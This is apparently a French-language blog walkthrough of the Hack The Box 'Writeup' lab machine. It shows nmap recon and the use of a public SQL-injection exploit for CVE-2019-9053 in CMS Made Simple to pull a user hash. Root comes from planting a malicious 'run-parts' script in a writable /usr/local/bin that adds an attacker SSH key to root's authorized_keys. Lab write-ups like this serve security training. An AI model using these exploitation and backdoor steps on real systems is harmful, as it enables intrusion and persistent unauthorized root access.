---
title: 'Writeup - Hack the box'
description: 'Machine writeup HTB walkthrough'
pubDate: 'Aug 08 2025'
heroImage: '../../assets/writeup.jpg'
---

# Reconnaissance

## Scan Nmap
```bash
nmap -sV -p- 10.129.215.21
```
**Ports ouverts :**
- 22/tcp  → SSH  
- 80/tcp  → HTTP

---


# Exploitation Web

## 1. Énumération
Accès à la route `/writeup` → CMS Made Simple  
Copyright 2003-2019 → version 2019 (inférieure à 2.2.10).

## 2. Exploit CVE-2019-9053 (SQL Injection)
```bash
searchsploit CMS Made Simple
searchsploit -m php/webapps/46635.py
mv 46635.py script.py

# Installation des dépendances Python 2
/etc/skel/.pyenv/versions/2.7.18/bin/pip2 install requests termcolor

# Lancement de l’exploit
/etc/skel/.pyenv/versions/2.7.18/bin/python2 script.py \
  -u http://10.129.215.21/writeup
```
**Résultats :**
- Salt : `5a599ef579066807`
- Utilisateur : `jkr`
- Email : `jkr@writeupz`
- Hash : `62def4866937f08cc13bab43bb14e6f7`

Déchiffrement :
```txt
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:**********
```

Identifiants SSH : jkr:**********

# Mouvement latéral & élévation de privilèges
## 1. Reconnaissance sur la cible
```bash
ls -ld /usr/local/bin /usr/local/sbin
# drwx-wsr-x 2 root staff 20480 Apr 19  2019 /usr/local/bin
# drwx-wsr-x 2 root staff 12288 Apr 19  2019 /usr/local/sbin
```
=> Groupe `staff` possède le droit d’écriture dans `/usr/local/bin`.

## 2. Sur la machine attaquante
```bash
# Téléchargement de pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
scp pspy32 jkr@10.129.215.21:/tmp
```

## 3. Sur la cible
```bash
cd /tmp
chmod +x pspy32

# Génération d’une paire de clés
ssh-keygen -f writeup
cat writeup.pub    # à copier

# Création d’un binaire « run-parts » malveillant
cd /usr/local/bin
vi run-parts
```
Contenu :
```bash
#!/bin/bash
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC... wesloo@htb' \
  >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```
```bash
chmod +x run-parts
# Attendre qu’un job cron exécute /usr/local/bin/run-parts
``

## 4. Connexion root
```bash
chmod 600 writeup
ssh -i writeup root@10.129.215.21
id
# uid=0(root) gid=0(root) ...
```
Root obtenu.